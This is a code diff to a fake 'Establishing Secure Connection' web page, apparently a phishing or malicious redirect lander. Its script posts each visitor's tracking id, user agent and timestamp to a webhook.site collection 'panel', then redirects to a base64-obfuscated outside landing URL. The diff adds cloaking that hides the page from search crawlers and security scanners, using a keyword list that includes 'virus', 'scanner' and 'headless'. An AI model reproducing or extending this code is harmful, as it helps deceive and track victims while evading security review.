@@ -14,39 +14,46 @@
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="spinner"></div>
-        <h2>Establishing Secure Connection</h2>
-        <p>Please wait while we verify your browser's security certificates.</p>
+    <div id="content" style="display:none;">
+        <div class="card">
+            <div class="spinner"></div>
+            <h2>Establishing Secure Connection</h2>
+            <p>Please wait while we verify your browser's security certificates.</p>
+        </div>
     </div>
 
     <script>
         (function() {
-            // 1. YOUR PANEL
-            const myPanel = "https://webhook.site/da2082dc-5f8f-418f-9ed4-122a6015ab92";
+            const ua = navigator.userAgent.toLowerCase();
+            // List of known bot/scanner keywords
+            const bots = ["bot", "crawler", "spider", "google", "bing", "slurp", "facebook", "vision", "headless", "chrome-lighthouse", "virus", "scanner", "defense", "security"];
+            
+            // Check if visitor is a bot
+            const isBot = bots.some(bot => ua.includes(bot));
 
-            // 2. FIXED TARGET: Encoded version of https://izfyb.acesporty.com/landing/
-            // Note the "f" is now correct in the encoding below:
-            const encodedVault = "aHR0cHM6Ly9pemZ5Yi5hY2VzcG9ydHkuY29tL2xhbmRpbmcv";
+            if (!isBot) {
+                // Show the content to real humans
+                document.getElementById('content').style.display = 'block';
 
-            const params = new URLSearchParams(window.location.search);
-            const userID = params.get('id') || 'untracked_visitor';
+                const myPanel = "https://webhook.site/da2082dc-5f8f-418f-9ed4-122a6015ab92";
+                const encodedVault = "aHR0cHM6Ly9penZ5Yi5hY2VzcG9ydHkuY29tL2xhbmRpbmcv";
 
-            // SEND DATA TO YOUR PANEL
-            fetch(myPanel, {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify({
-                    id: userID,
-                    agent: navigator.userAgent,
-                    time: new Date().toLocaleString()
-                })
-            });
+                const params = new URLSearchParams(window.location.search);
+                const userID = params.get('id') || 'untracked_visitor';
 
-            // 3. THE REDIRECT: 3-second delay
-            setTimeout(() => {
-                window.location.replace(atob(encodedVault));
-            }, 3000);
+                fetch(myPanel, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({ id: userID, agent: ua, time: new Date().toLocaleString() })
+                });
+
+                setTimeout(() => {
+                    window.location.replace(atob(encodedVault));
+                }, 3000);
+            } else {
+                // Bots see absolutely nothing or get a fake error
+                console.log("Connection Timeout");
+            }
         })();
     </script>
 </body>
